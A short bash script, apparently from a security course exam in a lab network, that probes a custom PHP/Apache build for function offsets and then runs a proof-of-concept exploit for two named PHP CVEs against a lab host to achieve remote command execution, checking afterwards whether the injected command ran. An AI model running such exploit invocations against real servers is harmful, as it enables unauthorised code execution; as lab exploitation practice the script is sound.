#!/usr/bin/env bash
# w2-official.sh — intento W2 con PHP del set oficial (sin intl/gd/exif) y Apache mínimo en 8081.
set -uo pipefail
cd "$(dirname "$0")/../.." || exit 1
VM=/home/kali/IS-EXAMEN-UNIDAD-1/informe/tools/vm.sh
POC=/tmp/opencode/php2shell/php2shell-CVE-2026-109618-CVE-2026-109619-PoC-main

echo "== PHP set oficial en 8081 =="
"$VM" m1 '
curl -s http://127.0.0.1:8081/info.php | sed "s/<[^>]*>/ /g" | tr -s " " | grep -iE "Thread Safety|memory_limit|display_errors|session.upload_progress.enabled" | head -4
nm /home/ubuntu/w2/httpd-prefork/modules/libphp-official.so | grep -E " (zif_system|zval_ptr_dtor)$"
'

echo
echo "== PoC contra 8081 (perfil bookworm) =="
cd "$POC"
python3 poc_patched.py \
  -u http://10.10.10.11:8081/session2.php \
  -c 'id>/tmp/p1' \
  --proof-file '' --fetch '' \
  --zif-offset 0x491f10 --dtor-offset 0x693450 \
  --profile bookworm --offsets-file '' --no-auto-offsets \
  --huge-mb 18

echo
echo "== Impacto =="
"$VM" m1 'cat /tmp/p1 2>/dev/null || echo "sin /tmp/p1: no hubo RCE"'
